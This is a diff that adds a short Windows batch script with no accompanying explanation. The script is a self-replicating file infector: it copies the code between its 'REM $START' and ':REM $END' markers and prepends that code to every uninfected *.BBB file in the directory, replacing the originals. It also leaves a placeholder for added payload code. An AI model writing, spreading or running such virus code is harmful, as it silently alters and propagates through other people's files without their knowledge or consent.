@@ -1,0 +1,16 @@
+REM $START
+COPY ""%0"" I.$
+FOR /F "DELIMS=" %%I IN (I.$) DO (
+IF NOT "%%I"==":REM $END" (ECHO %%I>>L.$) ELSE ECHO %%I>>L.$
+)
+FOR %%A IN (*.BBB) DO CALL :IFN "%%A"
+DEL ?.$&GOTO REM
+:IFN
+SET /P H=<%1
+IF NOT "%H%"=="REM $START" (
+COPY /B L.$ + %1 X.$ & DEL %1
+MOVE X.$ %1
+)
+:: USER CODE ::
+
+:REM $END
